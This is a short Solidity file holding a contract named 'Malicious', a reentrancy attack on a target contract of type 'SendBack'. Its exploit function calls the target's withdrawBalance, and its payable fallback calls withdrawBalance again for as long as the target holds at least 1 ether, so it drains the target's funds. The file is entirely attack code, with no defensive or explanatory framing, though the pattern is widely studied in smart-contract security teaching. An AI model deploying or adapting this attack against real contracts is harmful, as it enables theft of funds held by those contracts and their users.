pragma solidity ^0.4.0;

contract Malicious {
    SendBack public target;
    bool private attacked = false;

    constructor(address _target) public {
        target = SendBack(_target);
    }

    function exploit() public {
        require(!attacked);
        attacked = true;
        target.withdrawBalance(); // Initial call to withdrawBalance
    }

    function() public payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawBalance(); // Recursive call
        }
    }
}